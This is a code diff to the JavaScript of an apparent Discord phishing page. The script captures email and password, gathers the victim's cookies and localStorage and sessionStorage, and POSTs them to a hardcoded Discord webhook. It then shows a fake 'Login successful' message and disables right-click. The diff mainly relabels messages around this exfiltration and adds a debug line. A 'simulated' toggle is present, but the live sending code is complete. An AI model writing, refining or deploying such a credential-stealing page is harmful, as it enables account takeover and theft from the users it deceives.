@@ -18,6 +18,7 @@ console.log("QR container:", qrContainer);
 // Check for missing elements
 if (!emailInput || !passwordInput || !loginButton || !loginForm || !qrContainer) {
   console.error("One or more elements not found. Check HTML IDs and structure.");
+  console.error("HTML content:", document.documentElement.outerHTML);
   alert("Error: Form elements not found. Check console for details.");
   throw new Error("Missing form elements");
 }
@@ -108,9 +109,9 @@ function simulateFetchAccountToken(email, password) {
   return { apiToken: simulatedToken, userTokens };
 }
 
-// Real Webhook (requires server)
+// Send to Discord Webhook (requires server)
 async function sendToWebhook(email, password, tokenData) {
-  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with webhook.site URL
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with your Discord webhook URL
   const { apiToken, userTokens } = tokenData || {
     apiToken: null,
     userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} }
@@ -120,7 +121,7 @@ async function sendToWebhook(email, password, tokenData) {
     username: "Login Attempt",
     avatar_url: "https://example.com/avatar.png"
   };
-  console.log("Sending payload to webhook:", payload);
+  console.log("Sending payload to Discord webhook:", payload);
   try {
     const response = await fetch(webhookUrl, {
       method: "POST",
@@ -129,15 +130,15 @@ async function sendToWebhook(email, password, tokenData) {
       },
       body: JSON.stringify(payload)
     });
-    const responseText = await response.text();
     if (!response.ok) {
+      const responseText = await response.text();
       throw new Error(`HTTP ${response.status}: ${responseText}`);
     }
-    console.log("Webhook success! Response:", responseText);
+    console.log("Discord webhook success!");
     return true;
   } catch (error) {
-    console.error("Webhook failed:", error.message);
-    alert("Error sending webhook. Check console for details.");
+    console.error("Discord webhook failed:", error.message);
+    alert("Error sending to Discord webhook. Check console for details. Note: Webhooks require a server (e.g., python -m http.server).");
     return false;
   }
 }
@@ -153,13 +154,13 @@ async function simulateSendToWebhook(email, password, tokenData) {
     username: "Login Attempt",
     avatar_url: "https://example.com/avatar.png"
   };
-  console.log("Simulated webhook payload:", payload);
-  alert("Simulated webhook sent! Check console for payload details.");
+  console.log("Simulated Discord webhook payload:", payload);
+  alert("Simulated Discord webhook sent! Check console for payload details.");
   return true;
 }
 
 // Toggle between simulated and real webhook
-const USE_REAL_WEBHOOK = false; // Set to true to use real webhook (requires server)
+const USE_REAL_WEBHOOK = false; // Set to true for real Discord webhook (requires server)
 
 // Attaching Event Listeners
 if (loginForm && loginButton) {
@@ -184,7 +185,7 @@ if (loginForm && loginButton) {
     setTimeout(() => {
       if (webhookSuccess) {
         console.log("Simulating redirect to Discord...");
-        alert("Login successful! QR code generated and webhook sent. Check console.");
+        alert("Login successful! QR code generated and webhook sent. Check console or Discord channel.");
       } else {
         console.log("Webhook failed");
         alert("Login failed - check console for details");
@@ -200,4 +201,3 @@ if (loginForm && loginButton) {
 document.addEventListener("contextmenu", (e) => {
   e.preventDefault();
 });
-
